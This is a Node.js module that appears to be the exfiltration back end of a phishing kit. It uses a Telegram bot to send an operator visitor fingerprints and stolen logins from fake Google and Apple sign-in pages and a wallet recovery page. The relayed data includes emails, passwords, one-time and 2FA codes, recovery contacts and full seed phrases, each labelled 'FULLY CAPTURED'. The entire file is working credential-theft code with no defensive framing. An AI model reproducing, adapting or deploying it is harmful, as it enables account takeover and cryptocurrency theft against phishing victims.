const TelegramBot = require('node-telegram-bot-api');

// Initialize bot (will only work if token is provided)
let bot = null;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
  console.log('✅ Telegram bot initialized');
} else {
  console.log('⚠️  Telegram bot not configured (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)');
}

// Helper function to format messages
const escapeMarkdown = (text) => {
  if (!text) return '';
  return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
};

// Send visitor notification
const sendVisitorNotification = async (visitorData) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping visitor notification');
    return;
  }

  try {
    const message = `
🔔 *NEW VISITOR ALERT*

👤 *Visitor Details:*
━━━━━━━━━━━━━━━━━━━
📍 IP: \`${escapeMarkdown(visitorData.ipAddress)}\`
🌐 Page: ${escapeMarkdown(visitorData.page || 'Unknown')}
🗺 Timezone: ${escapeMarkdown(visitorData.timezone || 'Unknown')}
🌍 Language: ${escapeMarkdown(visitorData.language || 'Unknown')}

💻 *Device Info:*
━━━━━━━━━━━━━━━━━━━
🖥 Platform: ${escapeMarkdown(visitorData.platform || 'Unknown')}
📱 Screen: ${escapeMarkdown(visitorData.screenResolution || 'Unknown')}
🔍 Browser: ${escapeMarkdown(visitorData.userAgent?.substring(0, 60) || 'Unknown')}...

🍪 *Tracking Data:*
━━━━━━━━━━━━━━━━━━━
Cookies: ${visitorData.cookies ? '✅ Available' : '❌ None'}
Referrer: ${escapeMarkdown(visitorData.referrer || 'Direct')}

⏰ Time: ${new Date().toLocaleString()}
`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log('✅ Visitor notification sent to Telegram');
  } catch (error) {
    console.error('❌ Error sending visitor notification:', error.message);
  }
};

// Send credential capture notification (initial step)
const sendCredentialStartNotification = async (provider, data) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping credential start notification');
    return;
  }

  try {
    let message = '';
    
    if (provider === 'Google') {
      message = `
🎯 *GOOGLE AUTH STARTED*

📧 *Email Entered:*
\`${escapeMarkdown(data.email)}\`

📍 *Location Info:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
    } else if (provider === 'Apple') {
      message = `
🍎 *APPLE AUTH STARTED*

📧 *Apple ID Entered:*
\`${escapeMarkdown(data.appleId)}\`

📍 *Location Info:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
    } else if (provider === 'Recovery Phrase') {
      message = `
🔑 *RECOVERY PHRASE STARTED*

🗝 *Seed Phrase (12 words):*
\`${escapeMarkdown(data.seedPhrase?.substring(0, 80))}\`...

📍 *Location Info:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
    }

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ ${provider} start notification sent to Telegram`);
  } catch (error) {
    console.error('❌ Error sending credential start notification:', error.message);
  }
};

// Send complete credential capture notification
const sendCredentialCompleteNotification = async (provider, data) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping credential complete notification');
    return;
  }

  try {
    let message = '';
    
    if (provider === 'Google') {
      message = `
✅ *GOOGLE AUTH COMPLETE*

🎉 *Full Credentials Captured!*
━━━━━━━━━━━━━━━━━━━
📧 Email: \`${escapeMarkdown(data.email)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`
🔢 OTP: \`${escapeMarkdown(data.otp)}\`
📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
📮 Recovery: ${escapeMarkdown(data.recoveryEmail || 'Not provided')}

📍 *Location:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...

⏰ ${new Date().toLocaleString()}

🎯 *Status:* FULLY CAPTURED ✅
`;
    } else if (provider === 'Apple') {
      message = `
✅ *APPLE AUTH COMPLETE*

🎉 *Full Credentials Captured!*
━━━━━━━━━━━━━━━━━━━
📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`
🔢 2FA Code: \`${escapeMarkdown(data.otp)}\`
📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
📱 Device: ${escapeMarkdown(data.trustedDevice || 'Not provided')}

📍 *Location:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...

⏰ ${new Date().toLocaleString()}

🎯 *Status:* FULLY CAPTURED ✅
`;
    } else if (provider === 'Recovery Phrase') {
      message = `
✅ *RECOVERY PHRASE COMPLETE*

🎉 *Full Credentials Captured!*
━━━━━━━━━━━━━━━━━━━
🔑 Seed Phrase:
\`${escapeMarkdown(data.seedPhrase)}\`

📧 Email: \`${escapeMarkdown(data.email)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`

📍 *Location:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...

⏰ ${new Date().toLocaleString()}

🎯 *Status:* FULLY CAPTURED ✅
`;
    }

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ ${provider} complete notification sent to Telegram`);
  } catch (error) {
    console.error('❌ Error sending credential complete notification:', error.message);
  }
};

module.exports = {
  sendVisitorNotification,
  sendCredentialStartNotification,
  sendCredentialCompleteNotification
};
